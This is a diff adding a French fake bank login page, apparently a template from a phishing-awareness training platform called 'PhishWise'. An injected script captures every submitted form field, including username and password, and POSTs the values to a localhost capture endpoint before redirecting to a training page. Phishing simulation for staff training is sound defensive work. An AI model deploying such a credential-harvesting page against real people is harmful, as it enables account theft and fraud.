@@ -1,0 +1,316 @@
+<!DOCTYPE html><html lang="fr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portail Bancaire Sécurisé</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #e0e7ff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 30px;
+        } 
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #1a202c;
+        }
+        p {
+            font-size: 16px;
+            color: #4a5568;
+            margin-bottom: 30px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 18px;
+            margin-bottom: 20px;
+            border: 1px solid #cbd5e0;
+            border-radius: 8px;
+            font-size: 17px;
+            box-sizing: border-box;
+            transition: border-color 0.2s ease;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #4c51bf;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 15px 20px;
+            background-color: #4c51bf;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #3f45a8;
+        }
+        button:disabled {
+            background-color: #9ca3af;
+            cursor: not-allowed;
+        }
+        .extra-links {
+            margin-top: 25px;
+            font-size: 14px;
+        }
+        .extra-links a {
+            color: #4c51bf;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .extra-links a:hover {
+            text-decoration: underline;
+        }
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            display: none;
+        }
+    </style>
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.mx-auto{margin-left:auto;margin-right:auto}</style></head>
+<body>
+    <div class="login-container">
+        <div class="logo"> 
+            <svg class="mx-auto" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#4c51bf" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="2" y="7" width="20" height="15" rx="2" ry="2"></rect>
+                <path d="M12 12V2m-5 5v-2a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v2"></path>
+            </svg>
+        </div>
+        <h1>Accès à votre Compte</h1>
+        <p>Veuillez saisir vos identifiants pour accéder à votre portail bancaire sécurisé.</p>
+        
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="Identifiant ou numéro de client" required="">
+            <input type="password" id="password" name="password" placeholder="Mot de passe" required="">
+            <button type="submit" id="loginButton">
+                <div class="loading-spinner" id="loadingSpinner"></div>
+                <span id="buttonText">Se connecter</span>
+                <span class="loading-text" id="loadingText">Connexion...</span>
+            </button>
+        </form>
+        
+        <div class="extra-links">
+            <a href="#">Mot de passe oublié ?</a> | <a href="#">Aide</a>
+        </div>
+    </div>
+
+    <script>
+        // Récupérer les paramètres depuis l'URL
+        function getCampaignIdFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const pathParts = window.location.pathname.split('/');
+            // L'ID de campagne est dans le path /phishing/CAMPAIGN_ID
+            return pathParts[2] || urlParams.get('campaignId');
+        }
+
+        function getTargetEmailFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('email');
+        }
+
+        // Configuration
+        const CONFIG = {
+            REACT_APP_URL: window.location.origin,
+            CAMPAIGN_ID: getCampaignIdFromUrl(),
+            TARGET_EMAIL: getTargetEmailFromUrl()
+        };
+
+        // Gestionnaire de soumission du formulaire
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const button = document.getElementById('loginButton');
+            const buttonText = document.getElementById('buttonText');
+            const loadingText = document.getElementById('loadingText');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+
+            // Validation basique
+            if (!username || !password) {
+                alert('Veuillez remplir tous les champs.');
+                return;
+            }
+
+            // Afficher l'état de chargement
+            button.disabled = true;
+            buttonText.style.display = 'none';
+            loadingText.style.display = 'inline';
+            loadingSpinner.style.display = 'inline-block';
+
+            // Simuler un délai de traitement
+            setTimeout(() => {
+                // Construire l'URL de redirection vers TrainingView
+            const trainingUrl = `/training/${CONFIG.CAMPAIGN_ID}?email=${encodeURIComponent(CONFIG.TARGET_EMAIL)}`;
+                
+                console.log('Redirection vers:', trainingUrl);
+                
+                // Effectuer la redirection
+                window.location.href = trainingUrl;
+            }, 1500);
+        });
+
+        // Initialisation
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Page de phishing initialisée');
+            console.log('Campaign ID:', CONFIG.CAMPAIGN_ID);
+            console.log('Target Email:', CONFIG.TARGET_EMAIL);
+        });
+    </script>
+
+
+
+    <script>
+      (function() {
+        // Custom alert function to replace native alert()
+        window.customAlert = function(message) {
+          console.log('Custom Alert:', message);
+          // You can implement a more sophisticated modal/message box here if needed.
+          // For now, it just logs to console.
+          // Example: alert(message); // If you still want the native alert for simulation
+        };
+
+        console.log('🎯 PhishWise Universal Tracking activated');
+
+        // Wait for DOM to be ready
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', initTracking);
+        } else {
+          initTracking();
+        }
+
+        function initTracking() {
+          // Intercept all forms
+          const forms = document.querySelectorAll('form');
+          console.log('📝 Forms detected:', forms.length);
+
+          forms.forEach(function(form, index) {
+            form.addEventListener('submit', function(e) {
+              e.preventDefault();
+              console.log('📋 Form submission intercepted:', index);
+
+              // Collect all form data
+              const formData = new FormData(form);
+              const data = {};
+
+              // Extract data from inputs
+              for (let [key, value] of formData.entries()) {
+                data[key] = value;
+              }
+
+              // Add inputs not included in FormData (e.g., unchecked checkboxes, disabled inputs)
+              const inputs = form.querySelectorAll('input, select, textarea');
+              inputs.forEach(function(input) {
+                if (input.name && typeof data[input.name] === 'undefined') { // Only add if not already in formData
+                  if (input.type === 'checkbox' || input.type === 'radio') {
+                    data[input.name] = input.checked ? input.value : ''; // Capture checked state
+                  } else {
+                    data[input.name] = input.value;
+                  }
+                }
+              });
+
+              // Tracking metadata
+              data._campaignId = '68adce8299e03f73e4c19757';
+              data._timestamp = new Date().toISOString();
+              data._userAgent = navigator.userAgent;
+              data._referrer = document.referrer;
+              data._url = window.location.href;
+              data._formIndex = index;
+              data._formAction = form.action || 'N/A';
+              data._formMethod = form.method || 'GET';
+
+              console.log('📊 Collected data:', data);
+
+              // Send data
+              fetch('http://localhost:3000/api/phishing/capture', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+              }).then(function(response) {
+                console.log('✅ Data sent successfully');
+                // Redirect to learning page
+                window.location.href = 'http://localhost:3000/learning/68adce8299e03f73e4c19757';
+              }).catch(function(error) {
+                console.error('❌ Error sending data:', error);
+                // Redirect even on error
+                setTimeout(function() {
+                  window.location.href = 'http://localhost:3000/learning/68adce8299e03f73e4c19757';
+                }, 1000);
+              });
+            });
+          });
+
+          // Track link clicks
+          document.addEventListener('click', function(e) {
+            const link = e.target.closest('a');
+            if (link) {
+              const href = link.href;
+              console.log('🔗 Link clicked:', href);
+
+              // Send click event
+              fetch('http://localhost:3000/api/phishing/track-click', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  campaignId: '68adce8299e03f73e4c19757',
+                  clickedUrl: href,
+                  linkText: link.textContent.trim(),
+                  timestamp: new Date().toISOString(),
+                  userAgent: navigator.userAgent
+                })
+              }).catch(console.error);
+            }
+          });
+
+          // Track input field interactions (focus)
+          const inputs = document.querySelectorAll('input, textarea, select');
+          inputs.forEach(function(input) {
+            input.addEventListener('focus', function() {
+              console.log('🎯 Focus on:', input.name || input.type || input.id || 'unknown field');
+            });
+          });
+
+          console.log('🚀 Universal tracking initialized');
+        }
+      })();
+    </script>
+</body></html>
